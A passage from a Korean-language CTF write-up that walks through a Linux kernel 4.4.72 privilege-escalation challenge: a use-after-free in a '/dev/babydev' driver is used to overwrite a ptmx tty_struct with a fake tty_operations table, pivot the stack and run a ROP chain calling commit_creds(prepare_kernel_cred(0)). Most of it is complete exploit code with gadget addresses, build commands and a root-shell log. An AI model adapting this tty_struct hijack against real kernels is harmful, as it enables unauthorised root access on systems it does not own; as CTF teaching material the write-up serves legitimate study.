<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Boot took <span class="number">0.98</span> seconds</span><br><span class="line"></span><br><span class="line">/ $ id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">1000</span>(ctf) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">/ $ ./<span class="built_in">exp</span></span><br><span class="line">[    <span class="number">7.694453</span>] device open</span><br><span class="line">[    <span class="number">7.696076</span>] device open</span><br><span class="line">[    <span class="number">7.697377</span>] alloc done</span><br><span class="line">[    <span class="number">7.699022</span>] device release</span><br><span class="line">/ # id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>
<p><hr></p>
<h2 id="tty-struct-exploit"><a href="#tty-struct-exploit" class="headerlink" title="tty_struct exploit"></a>tty_struct exploit</h2><p><code>strcut tty_struct</code>를 이용한 exploit 과정을 간단히 설명하자면 다음과 같습니다.</p>
<ol>
<li><code>trap frame</code>을 구성하기 위해 유저 공간의 레지스터들을 저장합니다.</li>
<li><code>rop palyoad</code>와 가짜 <code>tty_operations</code>을 구성합니다.</li>
<li>디바이스 를 두 번 <code>open()</code>합니다. (<code>baby1</code>, <code>baby2</code>)</li>
<li><code>baby1</code> file descriptor에서 <code>babyioctl()</code> 함수를 이용해 <code>struct tty_struct</code>의 크기인 736byte 만큼의 heap을 할당합니다.</li>
<li><code>baby1</code>를 <code>close()</code>하여 <code>babyrelease()</code> 함수를 호출해 할당된 heap을 해제합니다. 여기서 heap 영역을 해제한 뒤 해당 주소를 저장한 구조체 멤버를 초기화하지 않아 <code>dangling pointer</code>가 발생합니다.</li>
<li><code>ptmx</code> 디바이스를 <code>open()</code>합니다.</li>
<li><code>baby2</code>를 이용하여 <code>ptmx</code> 디바이스의 <code>tty_struct</code> 를 유저 공간으로 받아와 <code>const struct tty_operations *ops;</code> 멤버를 우리가 생성한 가짜 <code>tty_operations</code>으로 덮습니다.</li>
<li>이렇게 만든 가짜 <code>tty_struct</code>를 <code>dangling pointer</code>를 이용하여 <code>ptmx</code>의 <code>struct tty_struct</code>가 있는 heap 영역에 덮어씁니다.</li>
<li><code>ptmx</code> 디바이스를 <code>write()</code> 함수로 호출하면 <code>fake tty_struct</code> -&gt; <code>fake tty_operations</code> -&gt; <code>rop payload</code> 순으로 호출되면서 root 권한을 획득하게 됩니다.</li>
</ol>
<p>문제 커널 버전인 <code>linux kernel v4.4.72</code>의 소스 코드를 보며 exploit 원리를 설명하겠습니다.</p>
<h5 id="tty-operations"><a href="#tty-operations" class="headerlink" title="tty_operations"></a>tty_operations</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">	<span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">		      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">	<span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">	<span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">	<span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">		    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br></pre></td></tr></table></figure>
<p><code>tty_operations</code> 구조체는 <code>&lt;linux/tty_drive.h&gt;</code> 헤더 파일에 선언되어 있습니다.<br>일종의 <code>file_operations</code>으로 <code>ptmx</code> 등의 디바이스에 대한 함수 포인터를 모아둔 구조체입니다.</p>
<p>예를 들어 <code>ptmx</code> 디바이스의 <code>tty_operations</code>에서 <code>.write = test_wrtie</code>  선언을 해두면, <code>ptmx</code> 디바이스에 대한 <code>wrtie()</code> 함수를 호출할 경우에 내부적으로 구현한 <code>test_write()</code> 함수가 호출되는 것입니다.</p>
<h5 id="ptmx-open"><a href="#ptmx-open" class="headerlink" title="ptmx_open()"></a>ptmx_open()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ptmx_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pts_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">slave_inode</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	nonseekable_open(inode, filp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We refuse fsnotify events on ptmx, since it's a shared resource */</span></span><br><span class="line">	filp-&gt;f_mode |= FMODE_NONOTIFY;</span><br><span class="line"></span><br><span class="line">	retval = tty_alloc_file(filp);</span><br><span class="line">	<span class="keyword">if</span> (retval)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	fsi = devpts_get_ref(inode, filp);</span><br><span class="line">	retval = -ENODEV;</span><br><span class="line">	<span class="keyword">if</span> (!fsi)</span><br><span class="line">		<span class="keyword">goto</span> out_free_file;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find a device that is not in use. */</span></span><br><span class="line">	mutex_lock(&amp;devpts_mutex);</span><br><span class="line">	index = devpts_new_index(fsi);</span><br><span class="line">	mutex_unlock(&amp;devpts_mutex);</span><br><span class="line"></span><br><span class="line">	retval = index;</span><br><span class="line">	<span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_put_ref;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;tty_mutex);</span><br><span class="line">	tty = tty_init_dev(ptm_driver, index);   <span class="comment">// here</span></span><br><span class="line">	<span class="comment">/* The tty returned here is locked so we can safely</span></span><br><span class="line"><span class="comment">	   drop the mutex */</span></span><br><span class="line">	mutex_unlock(&amp;tty_mutex);</span><br></pre></td></tr></table></figure>
<p>위 코드는 <code>pty.c</code>에 정의된, <code>ptmx</code> 디바이스를 <code>open()</code>할 때 호출되는 <code>ptmx_open()</code> 함수의 도입 부분입니다.<br>소스를 살펴보면 <code>tty_init_dev()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p>
<h5 id="tty-init-dev"><a href="#tty-init-dev" class="headerlink" title="tty_init_dev()"></a>tty_init_dev()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">tty_init_dev</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * First time open is complex, especially for PTY devices.</span></span><br><span class="line"><span class="comment">	 * This code guarantees that either everything succeeds and the</span></span><br><span class="line"><span class="comment">	 * TTY is ready for operation, or else the table slots are vacated</span></span><br><span class="line"><span class="comment">	 * and the allocated memory released.  (Except that the termios</span></span><br><span class="line"><span class="comment">	 * and locked termios may be retained.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(driver-&gt;owner))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENODEV);</span><br><span class="line"></span><br><span class="line">	tty = alloc_tty_struct(driver, idx);</span><br><span class="line">	<span class="keyword">if</span> (!tty) &#123;</span><br><span class="line">		retval = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> err_module_put;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>위 코드는 <code>tty_io.c</code>에 정의된 <code>tty_init_dev()</code> 함수의 도입 부분입니다.<br>코드를 보면 <code>alloc_tty_struct()</code> 함수를 호출하는 것을 볼 수 있습니다.</p>
<h5 id="alloc-tty-struct"><a href="#alloc-tty-struct" class="headerlink" title="alloc_tty_struct()"></a>alloc_tty_struct()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct tty_struct *<span class="title">alloc_tty_struct</span><span class="params">(struct tty_driver *driver, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line"></span><br><span class="line">	tty = kzalloc(<span class="keyword">sizeof</span>(*tty), GFP_KERNEL);   <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (!tty)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>위 코드 또한 <code>tty_io.c</code>에 정의된 <code>alloc_tty_struct()</code> 함수의 도입 부분입니다.<br>코드를 보면 <code>kzalloc()</code>함수를 호출하는 것을 볼 수 있습니다.</p>
<p>즉, <code>ptmx</code> 디바이스를 <code>open</code>하면 <code>tty_struct</code> 를 <strong>heap 영역에 할당한다</strong> 는 것을 알 수 있습니다.</p>
<h5 id="struct-tty-struct"><a href="#struct-tty-struct" class="headerlink" title="struct tty_struct"></a>struct tty_struct</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">int</span> index;</span><br></pre></td></tr></table></figure>
<p>위 코드는 <code>&lt;linux/tty.h&gt;</code> 헤더 파일에 선언된 <code>tty_struct</code>의 일부분입니다.<br><code>*ops;</code> 멤버가 <code>const struct tty_operations</code> 형인 것을 알 수 있습니다.</p>
<p><code>ptmx</code> 디바이스를 <code>open</code> 했을 때 <code>tty_struct</code>가 heap 영역에 할당되고 해당 부분은 uaf 취약점을 이용해 값을 덮어 쓸 수 있으므로 이 <code>*ops</code> 멤버를 가짜 <code>tty_operations</code>로 덮어쓴 뒤 <code>ptmx</code>의 특정 함수를 호출할 경우 우리가 원하는 주소가 실행됩니다.</p>
<h5 id="fake-tty-operations"><a href="#fake-tty-operations" class="headerlink" title="fake tty_operations"></a>fake tty_operations</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;   <span class="comment">// pop rax; ret;</span></span><br><span class="line">tty_operations[<span class="number">1</span>] = &amp;rop;</span><br><span class="line">tty_operations[<span class="number">2</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line">tty_operations[<span class="number">7</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br></pre></td></tr></table></figure>
<p>위 코드는 exploit에서 사용할 가짜 <code>tty_operations</code> 입니다.<br>이 <code>tty_operations</code>를 가짜 <code>tty_struct</code>의 4번째 멤버에 덮어 씌운 뒤 <code>ptmx</code> 드라이버를 인자로 <code>write()</code>함수를 호출하게 되면 tty_operations[7]의 주소가 호출되고 총 두 번의 <code>stack pivoting</code>을 통해 <code>rop</code>가 실행됩니다.</p>
<p>해당 payload를 이해하기 쉽도록 어셈으로 표현하면</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rax == &amp;tty_operatins</span><br><span class="line"></span><br><span class="line">mov   rsp, rax    // tty_operations[7], stack pivoting</span><br><span class="line">dec   dex</span><br><span class="line">jmp   &amp;ret</span><br><span class="line">ret</span><br><span class="line">pop   rax         // tty_operations[0], rax == &amp;rop</span><br><span class="line">ret</span><br><span class="line">mov   rsp, rax    // tty_operations[2], stack pivoting</span><br><span class="line">dec   ebx</span><br><span class="line">jmp   &amp;ret</span><br><span class="line">ret</span><br><span class="line">&amp;rop              // tty_operations[1]</span><br></pre></td></tr></table></figure>
<p>위와 같습니다. rax에 우리가 만든 가짜 <code>tty_operations</code>의 주소가 저장된 상태에서 두 번의 <code>mov  rsp, rax</code>로 인해 두 번의 <code>stack pivoting</code>이 일어납니다.<br>첫 번째 pivoting은 <code>tty_operations</code>, 두 번째 pivoting은 <code>rop</code>를 향해 진행됩니다.</p>
<h5 id="rop-payload"><a href="#rop-payload" class="headerlink" title="rop payload"></a>rop payload</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rop[<span class="number">0</span>] 	= <span class="number">0xffffffff810d238d</span>;   <span class="comment">// pop rdi; ret;</span></span><br><span class="line">rop[<span class="number">1</span>] 	= <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">2</span>] 	= prepare_kernel_cred;</span><br><span class="line">rop[<span class="number">3</span>] 	= <span class="number">0xffffffff810676e5</span>;   <span class="comment">// pop rdx; pop rcx; ret</span></span><br><span class="line">rop[<span class="number">4</span>] 	= commit_creds;</span><br><span class="line">rop[<span class="number">5</span>] 	= <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">6</span>] 	= <span class="number">0xffffffff8180c4a2</span>;   <span class="comment">// mov rdi, rax; call rdx;</span></span><br><span class="line">rop[<span class="number">7</span>] 	= <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">8</span>] 	= <span class="number">0xffffffff81063694</span>;   <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">rop[<span class="number">9</span>] 	= <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">10</span>]	= <span class="number">0xffffffff814e35ef</span>;   <span class="comment">// iretq; ret;</span></span><br><span class="line">rop[<span class="number">11</span>]	= &amp;shell;</span><br><span class="line">rop[<span class="number">12</span>]	= rv.user_cs;</span><br><span class="line">rop[<span class="number">13</span>]	= rv.user_rflags;</span><br><span class="line">rop[<span class="number">14</span>]	= rv.user_rsp;</span><br><span class="line">rop[<span class="number">15</span>]	= rv.user_ss;</span><br></pre></td></tr></table></figure>
<p><code>rop payload</code>는 위와 같습니다.</p>
<p>간단히 코드로 보면</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>위와 같습니다.</p>
<p><code>kernel rop</code>에 대해서는 별도의 글에서 구체적으로 다뤄보도록 하겠습니다.</p>
<h5 id="exploit-code-1"><a href="#exploit-code-1" class="headerlink" title="exploit code"></a>exploit code</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* tty_operations[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">register_val</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> user_rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_rflags;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">register_val</span> <span class="title">rv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backup_rv</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov rv+8, cs;"</span></span><br><span class="line">        <span class="string">"pushf; pop rv+16;"</span></span><br><span class="line">        <span class="string">"mov rv+24, rsp;"</span></span><br><span class="line">        <span class="string">"mov rv+32, ss;"</span></span><br><span class="line">       );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> trig[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    backup_rv();</span><br><span class="line"></span><br><span class="line">    rop[<span class="number">0</span>] 	= <span class="number">0xffffffff810d238d</span>;   <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[<span class="number">1</span>] 	= <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">2</span>] 	= prepare_kernel_cred;</span><br><span class="line">    rop[<span class="number">3</span>] 	= <span class="number">0xffffffff810676e5</span>;   <span class="comment">// pop rdx; pop rcx; ret</span></span><br><span class="line">    rop[<span class="number">4</span>] 	= commit_creds;</span><br><span class="line">    rop[<span class="number">5</span>] 	= <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">6</span>] 	= <span class="number">0xffffffff8180c4a2</span>;   <span class="comment">// mov rdi, rax; call rdx;</span></span><br><span class="line">    rop[<span class="number">7</span>] 	= <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">8</span>] 	= <span class="number">0xffffffff81063694</span>;   <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[<span class="number">9</span>] 	= <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">10</span>]	= <span class="number">0xffffffff814e35ef</span>;   <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">11</span>]	= &amp;shell;</span><br><span class="line">    rop[<span class="number">12</span>]	= rv.user_cs;</span><br><span class="line">    rop[<span class="number">13</span>]	= rv.user_rflags;</span><br><span class="line">    rop[<span class="number">14</span>]	= rv.user_rsp;</span><br><span class="line">    rop[<span class="number">15</span>]	= rv.user_ss;</span><br><span class="line"></span><br><span class="line">    tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;   <span class="comment">// pop rax; ret;</span></span><br><span class="line">    tty_operations[<span class="number">1</span>] = &amp;rop;</span><br><span class="line">    tty_operations[<span class="number">2</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line">    tty_operations[<span class="number">7</span>] = <span class="number">0xffffffff8181bfc5</span>;   <span class="comment">// mov rsp,rax; dec ebx; jmp ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> baby1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> baby2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(baby1, <span class="number">65537</span>, <span class="number">736</span>);</span><br><span class="line">    close(baby1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ptmx = open(<span class="string">"/dev/ptmx"</span>, O_RDWR|O_NOCTTY);</span><br><span class="line"></span><br><span class="line">    read(baby2, tty_struct, <span class="number">32</span>);</span><br><span class="line">    tty_struct[<span class="number">3</span>] = &amp;tty_operations;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&amp;rop : %p\n"</span>, &amp;rop);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&amp;tty_operations : %p\n"</span>, &amp;tty_operations);</span><br><span class="line"></span><br><span class="line">    write(baby2, tty_struct, <span class="number">32</span>);</span><br><span class="line">    write(ptmx, trig, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -masm=intel  -static -o exploit exploit.c</span><br></pre></td></tr></table></figure>
<p>exploit을 다 작성했으면 위의 옵션으로 컴파일해서, 환경 설정 과정에서 <code>rootfs.cpio</code> 파일 시스템의 압축을 풀었던 디렉토리에 옮긴 뒤에</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>위 명령어로 압축하면 새로운 <code>roofts.cpio</code> 파일이 나오는데 이 <code>rootfs.cpio</code> 파일을 이용해서 qemu를 실행하시면 해당 exploit 파일이 qemu 내부로 들어간 것을 확인할 수 있습니다.</p>
